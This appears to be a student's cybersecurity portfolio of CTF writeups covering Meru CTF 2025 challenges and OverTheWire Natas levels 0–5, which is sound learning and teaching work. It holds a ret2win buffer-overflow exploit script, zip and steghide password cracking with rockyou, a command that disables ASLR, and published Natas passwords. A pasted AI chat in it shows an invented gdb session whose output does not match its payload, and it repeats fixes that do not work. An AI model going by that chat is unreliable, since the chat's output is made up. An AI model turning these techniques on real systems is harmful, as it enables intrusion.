docs.title: Welcome to My Cybersecurity Portfolio
docs.text:
Hello there!

This portfolio documents my journey in cybersecurity and hands-on problem solving through:

  • CTF Writeups: TryHackMe, HackTheBox, OverTheWire, VulnHub, PicoCTF
  • Notes: Linux, Windows, Web Security, Networking, Reverse Engineering
  • Projects: Scripts, automation tools, and small security projects

docs.title: Explore
docs.text:
• About Me – Learn more about me and my journey
  • Competitions – All CTF competitions
  • Platforms – TryHackMe, OverTheWire, VulnHub

Thank you for visiting — happy hacking! 🛡️

docs.title: About Me
docs.text:
Hello there!

I maintain this portfolio to document my learning journey and hands-on experience in cybersecurity. My areas of focus include:

  • Penetration testing and exploitation
  • Capture the Flag (CTF) challenges
  • Linux & Windows security

I create detailed, structured writeups for CTFs and practical exercises, combining screenshots, explanations, and lessons learned.

This portfolio is continuously updated as I tackle new challenges and refine my skills.

Thank you for visiting!

docs.title: 🛡️ CTF Writeups
docs.text: This repository contains my personal collection of Capture The Flag (CTF) and cybersecurity challenge writeups. It is divided into two major sections:

docs.title: 📁 1. Platform-Based CTFs
docs.text: These are challenges completed on popular online cybersecurity platforms.

docs.title: Included Platforms
docs.text:
• HackTheBox
  • TryHackMe
  • VulnHub
  • OverTheWire

Each platform is organized by machine/challenge name, and every writeup follows a consistent format with screenshots stored in an assets/ folder and referenced using standard Markdown:

docs.title: 🏆 2. Competition-Based CTFs
docs.text: These are writeups from formal competitions, events, and school-based cybersecurity contests.

docs.title: Included Competitions
docs.text:
• PicoCTF
  • Meru CTF 2025
  • (More will be added as I participate in new events)

docs.title: Competitions
docs.text: This section contains writeups from various cybersecurity competitions I have participated in. Each event includes challenge breakdowns, methodologies, and solutions across different categories.

docs.title: Available Competitions
docs.text:
• Meru CTF 2025
  • PicoCTF (coming soon)
  • Other CTFs will be added here as I complete and upload their writeups.

docs.title: Meru CTF 2025 Writeups
docs.text: This section documents my writeups from the Meru CTF 2025 competition. Each writeup reflects a structured methodology, practical problem-solving, and lessons learned across multiple cybersecurity domains.

docs.title: What my writeups include
docs.text:
• Step-by-step challenge analysis
  • Exploitation methodology and reasoning
  • Screenshots, commands, and outputs
  • Key takeaways for each challenge

docs.title: Description
docs.text: Welcome to Bufferland, an ancient realm where knowledge is power and memory is brittle. A humble strory-teller invites you to share your tale - but beware: beyond his soft words lies a vulnerable stack. Only by telling a long enough story will you bend the flow of fate and uncover the vault he guards. You've found an unprotected binary, and i's waiting for your input. But nothing you say seems to impress it - unless you're willing to step out of bounds

docs.title: Hint
docs.text: "Those who overwrite the past shall change their future." The vault lies just beyond 64 characters ...

docs.title: Solution
docs.text:
I began by making the binary executable and running it to observe its behavior

chmod +x chall 

./chall

The program greeted me with a message about "Bufferland" and prompted for input. Entering a string just resulted in a generic response, with no flag revealed.

Next, I used strings to scan for any readable text within the binary

$ strings chall

This revealed several interesting lines, one including the flag

To confirm, I also loaded the binary into Cutter for disassembly. Searching through the strings and functions, I found the flag hardcoded

cutter chall


Flag : flag{buffering_into_the_void}

docs.title: AI Walkthrough
docs.text: Based on the provided decompilation and the flag encoding, you've correctly decoded the flag. Now, let's ensure we craft the correct exploit to print this flag by exploiting the buffer overflow vulnerability.

docs.title: Steps to Craft the Exploit
docs.text:
1. Confirm the Offset: The offset to the return address is 72 bytes (64 bytes for the buffer + 8 bytes for the saved RBP).
  2. Correct Address Format: Ensure the address of print_flag() is correctly formatted in little-endian.
  3. Align the Stack: Make sure the stack is properly aligned when returning to print_flag().

docs.title: Refined Python Exploit Script
docs.text:
Let's create a Python script to generate the payload:

python

Copy code

from struct import pack

# Define the sizes and addresses
buffer_size = 64
saved_rbp_size = 8
ret_addr = 0x401199  # Address of print_flag from nm output

# Craft the payload
payload = b"A" * buffer_size       # Fill the buffer with 'A's
payload += b"B" * saved_rbp_size   # Overwrite the saved RBP with 'B's
payload += pack("<Q", ret_addr)    # Overwrite the return address with print_flag address (little endian)

# Print the payload
print(payload)

docs.title: Running the Exploit
docs.text:
Save the payload to a file and run the exploit:

sh

Copy code

python3 exploit.py > payload
./glory < payload

Or directly pipe the output:

sh

Copy code

python3 exploit.py | ./glory

docs.title: Additional Debugging with gdb
docs.text:
If the segmentation fault persists, use gdb to debug the issue:

  1. Start gdb with the binary:

sh

Copy code

gdb ./glory
  1. Set a breakpoint at the print_flag function:

sh

Copy code

(gdb) break *0x401199
  1. Run the program with the payload:

sh

Copy code

(gdb) run < payload
  1. Examine the stack and registers to ensure everything is correctly aligned:

sh

Copy code

(gdb) info registers
(gdb) x/10x $rsp

docs.title: Example gdb Session
docs.text:
Here's an example of what a gdb session might look like:

sh

Copy code

gdb ./glory
(gdb) break *0x401199
Breakpoint 1 at 0x401199
(gdb) run < payload
Starting program: /path/to/glory < payload

Welcome again, brave soul.
The vault now guards its secrets well.
No strings can reveal what memory conceals...

So tell me your tale once more:
Alas, your tale ends here...

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401199 in print_flag ()
(gdb) info registers
rax            0x0  0
rbx            0x0  0
rcx            0x0  0
rdx            0x0  0
rsi            0x0  0
rdi            0x0  0
rbp            0x7fffffffe1f0  0x7fffffffe1f0
rsp            0x7fffffffe1e0  0x7fffffffe1e0
r8             0x0  0
r9             0x0  0
r10            0x0  0
r11            0x0  0
r12            0x0  0
r13            0x0  0
r14            0x0  0
r15            0x0  0
rip            0x401199  0x401199 <print_flag>
eflags         0x10202  [ IF RF ]
cs             0x33  51
ss             0x2b  43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0
(gdb) x/10x $rsp
0x7fffffffe1e0: 0x4141414141414141  0x4242424242424242
0x7fffffffe1f0: 0x9090909090909090  0x9090909090909090
0x7fffffffe200: 0x9090909090909090  0x9090909090909090
0x7fffffffe210: 0x9090909090909090  0x9090909090909090
0x7fffffffe220: 0x9090909090909090  0x9090909090909090

docs.title: Conclusion
docs.text:
By ensuring the correct offset, address format, and stack alignment, you should be able to successfully exploit the buffer overflow and print the flag. If the segmentation fault persists, the gdb output will provide more insights into what might be going wrong.

New

New

I have used that exploit, but nothing. SO, does it mean that this is the issue in registers? rip 0x40129c 0x40129c

Venice

Given that the rip register points to 0x40129c which is within the vulnerable function, it indicates that the return address on the stack was not correctly overwritten. This suggests that the offset calculation or the payload construction might be incorrect.

Let's re-evaluate the offset and ensure that the payload is correctly crafted.

docs.title: Re-evaluating the Offset
docs.text:
The buffer size is 64 bytes, and on a typical x86_64 system, the stack layout after the buffer would be:

  1. 64 bytes for the buffer (local_48).
  2. 8 bytes for the saved base pointer (RBP).
  3. 8 bytes for the return address.

So, the total offset to the return address from the start of the buffer should be:

docs.title: Refined Python Exploit Script
docs.text:
Let's create a more robust payload that ensures proper alignment and correct offset:

python

Copy code

from struct import pack

# Define the sizes and addresses
buffer_size = 64
saved_rbp_size = 8
ret_addr = 0x401199  # Address of print_flag from nm output

# Craft the payload
payload = b"A" * buffer_size       # Fill the buffer with 'A's
payload += b"B" * saved_rbp_size   # Overwrite the saved RBP with 'B's
payload += pack("<Q", ret_addr)    # Overwrite the return address with print_flag address (little endian)

# Print the payload
print(payload)

docs.title: Running the Exploit
docs.text:
Save the payload to a file and run the exploit:

sh

Copy code

python3 exploit.py > payload
./glory < payload

Or directly pipe the output:

sh

Copy code

python3 exploit.py | ./glory

docs.title: Conclusion
docs.text:
If the rip register still points to an incorrect address, it suggests that the return address on the stack was not correctly overwritten. Ensure that the offset is correct and that the payload is correctly formatted. If necessary, add more NOP slides to ensure proper stack alignment. The gdb output will provide more insights if the issue persists.

New

New

In all of thse, what I seem to understand is that it redirects it to Program received signal SIGSEGV, Segmentation fault. 0x000000000040129c in vulnerable () instead of the print_flag option: rip 0x401199 0x401199 , as you are suggesting here

Venice

Given that the rip register points to 0x40129c within the vulnerable function, it indicates that the return address on the stack was not correctly overwritten. This suggests that the offset calculation or the payload construction might be incorrect.

Let's re-evaluate the offset and ensure that the payload is correctly crafted. We'll also add more debugging information to understand what's going wrong.

docs.title: Re-evaluating the Offset
docs.text:
The buffer size is 64 bytes, and on a typical x86_64 system, the stack layout after the buffer would be:

  1. 64 bytes for the buffer (local_48).
  2. 8 bytes for the saved base pointer (RBP).
  3. 8 bytes for the return address.

So, the total offset to the return address from the start of the buffer should be:

docs.title: Refined Python Exploit Script
docs.text:
Let's create a more robust payload that ensures proper alignment and correct offset. We'll also add debugging information to print the payload in a readable format:

python

Copy code

from struct import pack

# Define the sizes and addresses
buffer_size = 64
saved_rbp_size = 8
ret_addr = 0x401199  # Address of print_flag from nm output

# Craft the payload
payload = b"A" * buffer_size       # Fill the buffer with 'A's
payload += b"B" * saved_rbp_size   # Overwrite the saved RBP with 'B's
payload += pack("<Q", ret_addr)    # Overwrite the return address with print_flag address (little endian)

# Print the payload in a readable format for debugging
print("Payload in hex:")
print(payload.hex())
print("Payload in ASCII:")
print(payload.decode('ascii', errors='ignore'))

# Save the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)

./glory < payload

Or directly pipe the output:

sh

python3 exploit.py | ./glory

  1. Start gdb with the binary:

Here's an example of what a gdb session might look like:

gdb ./glory

Breakpoint 1 at 0x401199
(gdb) run < payload
Starting program: /path/to/glory < payload

Welcome again, brave soul.
The vault now guards its secrets well.
No strings can reveal what memory conceals...

So tell me your tale once more:
Alas, your tale ends here...

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401199 in print_flag ()
(gdb) info registers
rax            0x0  0
rbx            0x0  0
rcx            0x0  0

rbp            0x7fffffffe1f0  0x7fffffffe1f0

r10            0x0  0

docs.title: Conclusion
docs.text:
By ensuring the correct offset, address format, and stack alignment, you should be able to successfully exploit the buffer overflow and print the flag. If the segmentation fault persists, the gdb output will provide more insights into what might be going wrong.

The behavior you're seeing — the program printing "Alas, your tale ends here..." and then "The vault remains sealed." without printing the flag — means your payload did not successfully redirect control flow to the print_flag() function. Instead, the program continued normal execution after vulnerable() returned.

docs.title: What this implies
docs.text:
• Your payload did not overwrite the return address correctly, or

  • The address you used for print_flag() is incorrect or not being jumped to, or

  • Some protection (like stack canaries or ASLR) is preventing your exploit.

docs.title: Checklist & Next Steps to Fix the Exploit
1. Confirm the offset to the return address
docs.text:
Make sure you know exactly how many bytes to overflow before hitting the return address.

  • Use a cyclic pattern to find the offset:

bash

# Generate a cyclic pattern of 100 bytes python3 -c "from pwn import *; print(cyclic(100))" > pattern # Run the program with the pattern as input ./glory < pattern

  • When it crashes, open gdb and find the overwritten return address value:

bash

gdb ./glory run < pattern # After crash, find the value of RIP (instruction pointer) info registers rip # Or check the stack to find the offset

  • Use pwntools to find the offset:

python

from pwn import * offset = cyclic_find(<value_of_rip>) print(offset)

This gives you the exact number of bytes needed to overwrite the return address.

docs.title: 2. Verify the address of print_flag()
docs.text:
• Use nm or objdump to get the exact address:

bash

nm ./glory | grep print_flag

  • Confirm the address is correct and that the binary is not PIE (if PIE is enabled, addresses will change each run).

docs.title: 3. Disable ASLR (for testing)
docs.text:
ASLR randomizes memory addresses on each run, making exploitation harder.

Disable it temporarily:

bash

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

docs.title: 4. Check for stack canaries
docs.text:
Run checksec on the binary:

bash

checksec ./glory

If stack canaries are enabled, your overflow will be detected and the program will terminate before executing your payload.

docs.title: 5. Craft the payload with correct offset and address
docs.text:
Once you have the correct offset and address, build the payload:

python

from struct import pack offset = <correct_offset> print_flag_addr = 0x<print_flag_address> # replace with actual address payload = b"A" * offset payload += pack("<Q", print_flag_addr) print(payload.decode('latin-1')) # or write to file and pipe

docs.title: 6. Run the exploit
docs.text:
bash

python3 exploit.py | ./glory

docs.title: Summary
docs.text:
Your payload is not working because the return address is not correctly overwritten or the address is wrong. Use a cyclic pattern to find the exact offset, verify the print_flag() address, and check for protections like ASLR or stack canaries.

The error NameError: name 'cyclic_find' is not defined happens because you imported from pwn import * but did not import cyclic_find explicitly or you are calling it without prefix.

In pwntools, cyclic_find is inside the pwnlib.util.cyclic module, and you can import it explicitly or call it via pwn.cyclic_find.

docs.title: How to fix your script
docs.text:
Option 1: Import cyclic_find explicitly

python

from pwn import cyclic_find offset = cyclic_find(0x40129c) # or the value you want to find print(offset)

Option 2: Import everything and call with prefix

python

from pwn import * offset = cyclic_find(0x40129c) # should work if imported * print(offset)

If it still fails, try:

python

import pwn offset = pwn.cyclic_find(0x40129c) print(offset)

docs.title: Important note on cyclic_find argument
docs.text:
• If you pass an integer like 0x40129c, cyclic_find expects a 4-byte little-endian integer.

  • If you want to find the offset of bytes in a cyclic pattern, pass the bytes, not the address directly.

  • For example, if you have a crash address, convert it to bytes first:

python

from pwn import * # Suppose the crash address is 0x61616162 (b'a a a b') crash_bytes = pack("<I", 0x61616162) # pack as 4-byte little endian offset = cyclic_find(crash_bytes) print(offset)

docs.title: Summary
docs.text:
• Import cyclic_find explicitly or call it with pwn.cyclic_find.

  • Pass a bytes object (4 bytes) to cyclic_find, not a raw integer.

  • Use pack("<I", value) to convert integer to bytes before calling cyclic_find.

docs.title: Description
docs.text: The vaulkeeper has learned from Bufferland's mistakes. No longer does he leave the flag out in the pen. He mocks your tools, your reliance on strings, and your lazy static analysis. But the flaw still lies within - hidden, yes, but not unreachable. To reveal the secret now, you must force the keeper to construct it.

docs.title: Hint
docs.text: "The flag is real, but not revealed - until you walk the path unwritten." You won't see it, but you can still reach it. Try harder

docs.title: Solution
docs.text:
This challenge appeared to be a follow-up to the previous Bufferland task, so I expected another binary exploitation scenario.

I started by making the binary executable and running it

chmod +x glory

./glory

The program greeted me, asked for input, and then ended with “The vault remains sealed.” Trying simple input didn’t reveal anything.

Next, I ran strings and explored the binary in Cutter, but found nothing useful. I then turned to Ghidra for a deeper look

Before I even continue to get the flag, I analyzed the codes in the binary and made a notice

There are 4 functions here that we need to analyze : intro, main, print_flag and vulnerable

docs.title: Code Summary
docs.text:
• intro() prints the welcome messages.

  • vulnerable() reads user input but does not print the flag.

  • main() calls intro(), then vulnerable(), and finally prints "The vault remains sealed."

  • The flag is printed only by print_flag(), which is never called directly in main().

What this means is that the program expects an input, but no input alone will cause the flag to be printed.

print_flag function :

vulnerable function:

To get the flag output, you need to exploit the buffer overflow vulnerability in vulnerable() (because it uses gets() unsafely) to overwrite the return address and redirect execution to the print_flag() function.

This is a classic binary exploitation scenario where you provide a crafted input (payload) that overflows the buffer and hijacks control flow.

docs.title: Step 1: Determine the Offset to the Return Address
docs.text: The buffer size is 64 bytes. On a typical x86_64 system, the return address is located after the buffer and the saved frame pointer (RBP). Therefore, the offset to the return address is:

docs.title: Step 2: Find the Address of print_flag()
docs.text:
Use a tool like objdump, nm, or Ghidra to find the memory address of the print_flag() function. For example:

nm -C ./glory | grep print_flag

docs.title: Step 3: Craft the Payload
docs.text:
Create a payload that overflows the buffer and overwrites the return address with the address of print_flag(). Here's a Python script to generate the payload:

from struct import pack

# Define the sizes and addresses
buffer_size = 64
saved_rbp_size = 8
ret_addr = 0x401199  # Place the actual print_flag address

# Craft the payload
payload = b"A" * buffer_size       # Fill the buffer with 'A's
payload += b"B" * saved_rbp_size   # Overwrite the saved RBP with 'B's
payload += pack("<Q", ret_addr)    # Overwrite the return address with print_flag address (little endian)

print(payload)

docs.title: Step 4: Run the Exploit
docs.text:
Save the payload to a file or pipe it into the program. For example:

python exploit.py > payload
./glory < payload

Or directly pipe the output:

python exploit.py | ./glory

It however did not work because the exploit had an issue. Pending creation of the exploit, I knew that the flag is stored in the print_flag function, but it is encoded as a series of 64-bit hexadecimal values assigned to local variables, then printed as a flag as a string The values represent parts of the flag in memory. To find the flag, you need to convert these hex values into ASCII characters and concatenate them.

NB : You need to convert the hexadecimal values into little-endian byte order because that is how the data is stored in memory of the target machine (which is almost certainly a little-endian architecture like x86 or x86_64)

I thus created a script which will decode the flag from the hexadecimal values you provided, following the little-endian byte order, and prints out the full flag.

def decode_flag():
    # Hex values from the print_flag function
    hex_values = [
        0x5f306e7b67616c66,
        0x77306c6672337630,
        0x72306c675f306e5f,
        0x7d79
    ]

    flag_bytes = b""

    for val in hex_values:
        # Determine how many bytes to extract (8 bytes for full 64-bit values, less for the last)
        length = 8 if val > 0xFFFF else 2

        # Convert the integer to bytes in little-endian order
        flag_bytes += val.to_bytes(length, byteorder='little')

    # Decode the concatenated bytes to ASCII string
    flag = flag_bytes.decode('ascii')

    print("[+] Decoded flag:", flag)

if __name__ == "__main__":
    decode_flag()


Flag : flag{n0_0v3rfl0w_n0_gl0ry}

docs.title: How the above python code works:
docs.text:
• Each 64-bit integer is converted to bytes in little-endian byte order.

  • The last value is shorter (only 2 bytes).

  • All bytes are concatenated and decoded to ASCII.

  • The script prints the decoded flag.

docs.title: Description
docs.text: A strange encrypted message was discovered in an old backup, buried under layers of weak but cleverly stacked ciphers. It looks simple—maybe too simple. Can you break through the layers and uncover the flag?

docs.title: Challenge
docs.text:
I opened the contents of the file

cat crypto_challenge1.txt

docs.title: Solution
docs.text:
We are provided with a file containing some descriptions and an encrypted message: c3ludHtmMzNfMWdmX2d1NGdfMzRmbH0=

The presence of the trailing = suggests the message is Base64 encoded. To decode it, we can use online tools like CyberChef or dcode.fr, but I prefer using the terminal:

echo "c3ludHtmMzNfMWdmX2d1NGdfMzRmbH0=" | base64 -d

The decoded string looks like a flag but appears to be encoded with another cipher. Recognizing the pattern, it is likely ROT13, which shifts each alphabet letter 13 places forward, wrapping around the alphabet, while numbers and symbols remain unchanged. This selective letter substitution is a hallmark of ROT13 encoding.

Applying ROT13 using CyberChef or dcode.fr reveals the actual flag.

Alternatively, you can decode ROT13 in the terminal using the tr command tr is used to translate or delete characters

echo "synt{f33_1gf_gu4g_34fl}  " | tr 'A-Za-z' 'N-ZA-Mn-za-m' 


FLAG : flag{s33_1ts_th4t_34sy}

docs.title: Description
docs.text: "Sometimes the most colourful thoughts are worth writing down. When the clouds speak in riddles, perhaps it's worth turning their words into keys." The answer might be hiding in what's said, not just what's seen. Something about this photo doesn't feel natural. Can you discover its hidden secret?

docs.title: Hint
docs.text: Ever heard of a wordlist ...!!!

docs.title: Solution
docs.text:
When I first opened the image, I saw a tarmac road bordered by trees, with what appeared to be a sunset in the background. Although the scene looked ordinary at first glance, the challenge description made me suspect there was more beneath the surface.

My initial approach was to examine the image’s metadata using exiftool. This tool is excellent for uncovering hidden information embedded in files. Running the command:

exiftool challenge.jpg

I carefully reviewed the output and noticed an intriguing comment Aint sth good like when the cloud is purple

This comment stood out as it seemed deliberately placed and possibly relevant to the challenge.

Suspecting there might be hidden data, I next tried extracting information using steghide

steghide extract -sf challenge.jpg

However, steghide prompted me for a passphrase, which I didn't have. At this point, I decided to use a brute-force approach with stegseek, leveraging the popular rockyou.txt wordlist

stegseek challenge.jpg /usr/share/wordlists/rockyou.txt

After some time, stegseek successfully found the passphrase "purplecloud"

It also revealed that the hidden file was named flagged.xcf and extracted it as challenge.jpg.out. Since .xcf is the native file format for GIMP, I opened this file in GIMP to investigate further. Upon opening it, I found the flag embedded within the image layers.

Alternatively, for a quicker approach, I used the strings command to search for flag-like patterns directly in the extracted file:

strings challenge.jpg.out | grep flag{


FLAG : flag{r3ds_are_susp1c10us}

docs.title: Description
docs.text: Thanks for helping me figure out where I was before getting lost during the maandamano - I owe you one! But the journey isn't over yet. See, I'm a man of clues - I always leave trails behind. And guess what? I left a visual clue in the first image i SENT YOU. Now that my friend helped me remember where I was, I noticed something else: he didn't just leave me a clue - he also left me the location of the t3rmin4t0rs Flash CTF! But it's conealed. He gave me a hint: "To retrieve the file holding the location, you'll need a passphrase. The passphrase is a 10-letter word. It's the name of the place you're close to - it can be seen"

docs.title: Hint
docs.text: Ayy I already gave you hint... But I look closely in the image you'll get

docs.title: Solution
docs.text:
Even before we proceed, we obtain some crucial information from the description alone:

  1. We will need a passphrase to retrieve the hidden file containing the location of the CTF.

  2. The passphrase is a 10-letter word, which is the name of a place visible in the image.

  3. There is a visual clue hidden inside the image that hints at this passphrase.

Given these clues, it’s clear that steganography tools like steghide or stegseek will be needed to extract the concealed data using the passphrase.

Opening the image, I noticed it resembled the first Stewie challenge (Where’s Stewie?), but this time Stewie was standing. In the background, there was a lake, a tree, a flagpost, and a building. A quick reverse image search revealed it was the parliament.

Wait..., parliament is a perfect 10-letter word!

Without hesitation, I jumped direct to steghide

steghide extract -sf picnic1.jpg

Alas, the passphrase parliament is correct.

Trying to unzip the secret_flag.zip file, it prompts for a password, which I didn't know.

unzip secret_flag.zip

Time to crack it. I launched fcrackzip with the rockyou wordlist:

fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt secret_flag.zip

Similarly, we can use john the ripper to crack it

zip2john secret_flag.zip > hash 

john -w=/usr/share/wordlists/rockyou.txt hash

We find the password as : password

With the password in hand, I extracted the zip, I found a file containing the flag

unzip secret_flag.zip

And thus opening the file revealed the flag 

cat secret_flag.txt       


FLAG : flag{d33ply_c0nc34l3d}

docs.title: Description
docs.text: Hey, it's me - Stewie Griffin. I heard the t3rmin4tors are hosting a Flash CTF in Nairobi, and naturally, I had to show up to dominate. But things went totally sideways during the maandamano. Long story short: chaos, tear gas and somehow I landed in a place I don't even remember! My friend left me a clue about where I was before I got lost - it's hidden somewhere inside this image I snapped before everything went dark. Can you help me figure out where I was before I vanished? All I want is to make it to the CTF on time. Find out where the clue is!

docs.title: Solution
docs.text:
First, I opened the image to check what it showed. It was a picture of me having a picnic in the park. In the background, I noticed a small lake and a building that looked like the parliament. That seemed like a good starting point.

Next, I ran exiftool on the image to inspect its metadata

exiftool picnic.png

The output revealed a lot of standard info, but one thing caught my eye — the Description field contained this string `666c61677b315f7734355f683372337d

At first, I thought it might be a hash, but it didn’t match common hash formats like MD5 or SHA256. Instead, it looked like a hexadecimal-encoded ASCII string.

To decode it, I used the xxd command and it gave me the flag

echo "666c61677b315f7734355f683372337d" | xxd -r -p

  • The command xxd -r -p converts a plain hex string back into readable text or binary.

  • -r means reverse the hex dump back to original data.

  • -p means the input is a continuous hex string without extra formatting.

So the clue was right there in the metadata — a hex-encoded flag telling me exactly where I was before I vanished.

FLAG : flag{1_w45_h3r3}

docs.title: Description
docs.text: Stay focused...!!! Can you find the needle in the static?

docs.title: Solution
docs.text:
First was to extract files from the zip file given 

unzip maze_of_lies.zip

The archive exploded into multiple folders (logs, docs, data, 2022, misc) filled with tons of log and text files—almost like a zip bomb. Navigating through all of them would be tedious.

To simplify, I listed the archive contents with the -l flag. This showed file names, sizes, and timestamps without extracting

unzip -l maze_of_lies.zip

Scanning through, I spotted an unusual file. All of the files had a 4 digit length but this one had 3 digits

To print the file contents directly without extracting it, I used the -p flag and the output was :

unzip -p maze_of_lies.zip logs/notes/old/real_note.txt

Recognizing base64 encoding, I decoded both strings:

 echo "bWF5YmUgeW91J3ZlIGZvdW5kIHRoZSBmbGFnLCBvciBtYXliZSBub3QuCg==" | base64 -d


echo "ZmxhZ3swbmx5XzBuZV90cnVlX2YxbGVfaW5fdGgzX21hemV9" | base64 -d

This approach saved me from extracting hundreds of files and quickly led me to the flag hidden in a small, overlooked file

FLAG : flag{0nly_0ne_true_f1le_in_th3_maze}

docs.title: Description
docs.text: A mysterious QR code has been found printed on a sticky note at a hacker's desk. It seems like just an ordinary QR code... or is it?

docs.title: Solution
docs.text:
The challenge had 2 downloadable files. First, I tried extracting the zip, but it was password protected. I attempted cracking it with fcrackzip and john the ripper—no luck

So, I turned to the QR code. On Linux, I used zbarimg to scan it

zbarimg challenge_qr.png              


output : ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>.+.+++++++++++.<<++++++++++++++++++.>>+.<<+++.

This looked like Brainfuck code from a previous CTF I did. I decoded it on dcode.fr and got

dep0q3

I tried this as the zip password, but it failed. Seeing the format of that password, it hinted at a ROT13 cipher, SO i DECODED IT

echo dep0q3 | tr 'A-Za-z' 'N-ZA-Mn-za-m'

Using qrc0d3 as the password, I successfully extracted the zip

unzip qr_flag.zip

Finally, I read the flag

cat flag.txt

This challenge was a clever mix of steganography and cipher 

FLAG : flag{qr_c0des_ar3_fun}

docs.title: Description
docs.text: Somewhere lies the flag...!!!

docs.title: Solution
docs.text:
I was handed a zip file and upon extracting it, I found a maze of folders and even another zip file nested inside. It was a zip bomb

unzip partial.zip

Faced with this sprawling extraction, my first instinct was to clean house—delete all the extracted clutter so I could start fresh. But I needed to be careful not to delete the original zip file or any other important files.

To do this, I identified the files I wanted to keep—my partial.zip and a stray image file called pasted image.png. Then, I ran this command to wipe everything else

find . -maxdepth 1 ! -name '*.zip' ! -name '.' -exec rm -r {} +

What the command does:

  • find .: Search in the current directory (.).

  • -maxdepth 1: Only look at files/directories directly inside the current directory (do not search recursively).

  • ! -name '*.zip': Exclude files with the .zip extension.

  • ! -name '.': Exclude the current directory itself from the results.

  • rm -r recursively deletes directories and their contents.

  • The + at the end groups multiple files/directories for efficiency.

  • This will delete all files and directories except .zip files.

Indeed, every folder was deleted. I accessed the nested_decoy file but it had nothing

To view the content of the zip file next without extracting it, I used -l flag. This showed file names, sizes, and timestamps

 unzip -l partial.zip

Before even I proceeded further, one line caught my eye, a hint I had missed before : Extract with care. Real base64 flag shards are in home/secrets/flag_*.txt

The first thing I thought was to see if indeed there was existence of such a file with the file path /home/secret, and indeed it was there, e.g

Next, I now extracted only the files with those file path and outputted in a folder called extracted

unzip partial.zip "home/secrets/flag_*.txt" -d extracted

Inside the extracted/home/secrets folder, I found four files named flag_1.txt through flag_4.txt. Their contents looked like fragments of a puzzle

cat extracted/home/secrets/flag_*.txt | base64 -d

Recognizing these as Base64-encoded strings, I combined and decoded them in one go

cat extracted/home/secrets/flag_*.txt | base64 -d

And just like that, the flag revealed itself.

FLAG : flag{3xtr4ct_0nly_wh4t_m4tt3rs}

docs.title: Description
docs.text: As a curious web crawler, you’ve landed on the t3rmin4t0rs CTF server. But not everything is visible at first glance… some things are hidden in plain sight. Can you find the first flag the admins didn’t want bots to see?

docs.title: Solution
docs.text:
When exploring any website, one of the first places a curious web crawler—or anyone interested in reconnaissance—should check is the robots.txt file.

This is a simple text file located in the root directory of a website that serves as a set of instructions for web crawlers or bots. Its primary purpose is to guide these bots on which parts of the site they are allowed or disallowed to access and index.

While it doesn’t enforce access restrictions, well-behaved bots usually respect these directives to avoid crawling sensitive or irrelevant sections of the site.

Knowing that many websites use a robots.txt file to guide web crawlers, I navigated to

http://<target-server>/robots.txt

Opening the robots.txt file, I found a suspicious string that looked like Base64 encoded data rather than the usual disallow rules.

I copied the string 

ZmxhZ3t3M2xjMG0zX3QwX3Qzcm1pbjR0MHJzX2ZsNHNoX2N0Zn0=

and decoded it using the command:

echo "ZmxhZ3t3M2xjMG0zX3QwX3Qzcm1pbjR0MHJzX2ZsNHNoX2N0Zn0=" | base64 -d
flag{w3lc0m3_t0_t3rmin4t0rs_fl4sh_ctf} 

FLAG : flag{w3lc0m3_t0_t3rmin4t0rs_fl4sh_ctf}

docs.text:
OverTheWire provides progressive wargames that strengthen foundational cybersecurity skills such as web exploitation, authentication bypass, encoding/decoding, and privilege escalation.

This section contains writeups for challenges I have completed, starting with the Natas wargame.

Focused on web security challenges.

  • Natas

docs.title: Natas — Web Security WarGame
docs.text:
Welcome to Natas, OverTheWire’s legendary web exploitation series.

These writeups cover levels 0–5, with screenshots, explanations, and learning notes.

docs.title: Completed Levels
docs.text:
• Natas 0
  • Natas 1
  • Natas 2
  • Natas 3
  • Natas 4
  • Natas 5
  • …more levels coming soon 🔒

docs.title: Description
docs.text:
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org

docs.title: Walkthrough
docs.text:
Logged in

View source code

password1 : 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

docs.title: Description
docs.text:
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org

docs.title: Walkthrough
docs.text:
Viewed the Webpage

So, I tried to right click it, but got nothing

Normally, to view the webpage, we use CTRL+U and we see the source code

``` password2 : TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

docs.title: Description
docs.text:
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org

docs.title: Walkthrough
docs.text:
Accessed the webpage

Tried source code

There was nothing there, but I got an image link.

Upon visiting it, there was nothing but the url seemed interesting I navigated back to the files directory and I saw a file, users.txt

I used wget command to get the file and I viewed the contents of users.txt. For it, I got a 401 error message meaning I needed to be authenticated

wget --user=natas2 --password=TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt

Contents of users.txt

password3 : 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

docs.title: Description
docs.text:
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org

docs.title: Walkthrough
docs.text:
Accessed the webpage

Viewed the source code

Since there was nothing, I decided to visit robots.txt

Robots.txt is a file in which the directories plus files that you don't want to be indexed by google web crawlers you place

In it, was a directory s3cr3t

The contents had users.txt file, thus we get it

wget --user=natas3 --password=3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

Opened the file and got the creds for natas4

password4 : QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

docs.title: Description
docs.text:
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org

docs.title: Walkthrough
docs.text:
Viewed the source code and got a text saying : Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Upon refreshing the page, we get this : Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

As per the message, we note that we need to forward a request from the natas5 URL, so we ought to edit the Refer to natas5 url Capture the request with burpsuite and head over to the refer part

Edit it and input the url : http://natas5.natas.labs.overthewire.org/

We are told access granted and we are given the password for the next level

password5 : 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

docs.title: Description
docs.text:
